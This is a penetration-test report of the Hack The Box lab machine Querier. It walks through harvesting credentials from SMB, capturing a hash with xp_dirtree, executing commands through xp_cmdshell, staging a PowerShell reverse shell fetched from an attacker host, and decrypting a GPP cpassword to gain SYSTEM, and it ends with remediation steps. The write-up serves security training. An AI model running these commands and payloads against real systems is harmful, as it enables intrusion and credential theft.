# Penetration Test Report — Querier

![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Focus](https://img.shields.io/badge/focus-MSSQL%20%2F%20GPP-red)

## Executive Summary

An authorized assessment of `target.htb` identified a world-readable SMB share hosting a macro-enabled Excel spreadsheet containing hardcoded MSSQL credentials. The MSSQL service was coerced into authenticating to an attacker-controlled host, leaking a NetNTLMv2 hash for the service account, which was cracked offline. With sysadmin privileges on the database, command execution was achieved via `xp_cmdshell`. Post-exploitation revealed cached Group Policy Preferences credentials, yielding the local Administrator password and full SYSTEM compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | World-readable share with macro-enabled spreadsheet containing DB credentials | High |
| 2 | MSSQL service account hash capture via forced authentication (xp_dirtree) | High |
| 3 | Weak service-account password (offline-cracked) | High |
| 4 | Cached GPP `cpassword` in Groups.xml — recoverable Administrator password | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports target.htb
```

SMB (445), WinRM (5985) and MSSQL (1433) were open; domain `HTB.LOCAL`.

### 2. SMB — The Spreadsheet

Null-session share enumeration:

```bash
smbclient -N -L \\\\target.htb
smbclient -N \\\\target.htb\\Reports
```

The `Reports` share contained `Currency Volume Report.xlsm`. Extracting the macro project exposed an MSSQL connection string with credentials:

```bash
unzip "Currency Volume Report.xlsm"
strings xl/vbaProject.bin
```

### 3. Hash Capture and Foothold

Authentication with the leaked credentials succeeded but lacked sysadmin rights (`xp_cmdshell` denied). The service account's hash was captured by forcing SMB authentication to an attacker host running Responder:

```sql
exec xp_dirtree '\\<attacker-ip>\share\file'
exec xp_fileexist '\\<attacker-ip>\share\file'
```

The NetNTLMv2 hash cracked to `corporate568`:

```bash
john hash -w=rockyou.txt
```

Re-authenticating as `mssql-svc` returned `IS_SRVROLEMEMBER('sysadmin') = 1`. Command execution:

```bash
mssqlclient.py mssql-svc@target.htb -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami
```

A Nishang reverse shell was staged over HTTP:

```bash
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <attacker-ip> -Port 4444' >> Invoke-PowerShellTcp.ps1
python3 -m http.server 80
```

```sql
xp_cmdshell powershell iex(new-object net.webclient).downloadstring("http://<attacker-ip>/Invoke-PowerShellTcp.ps1")
```

### 4. Privilege Escalation — Cached GPP Password

PowerUp's `Invoke-AllChecks` identified credentials in a cached Group Policy Preferences file:

```powershell
cat 'C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml'
```

The `cpassword` value was decrypted with the published Microsoft AES key:

```python
from Crypto.Cipher import AES
from base64 import b64decode
cpassword = "CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"
key = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(b64decode(cpassword))
print(o[:-ord(o[-1])].decode('utf16'))
```

Recovered: `Administrator:MyUnclesAreMarioAndLuigi!!1!`. SYSTEM shell via PsExec:

```bash
psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@target.htb
```

## Remediation

- Remove macros/credentials from shared documents; scan shares for embedded secrets.
- Run database services under gMSA or strong, unique passwords; block SMB egress from servers.
- Delete cached `Groups.xml` files and never use GPP for password distribution (MS14-025).
- Disable `xp_cmdshell`; enforce least privilege on SQL logins.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1552.001 — Credentials in Files |
| Credential Access | T1557.001 — LLMNR/NBT-NS Poisoning & SMB Relay (forced auth) |
| Execution | T1059 — Command & Scripting Interpreter (xp_cmdshell) |
| Privilege Escalation | T1552.006 — GPP Credentials |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
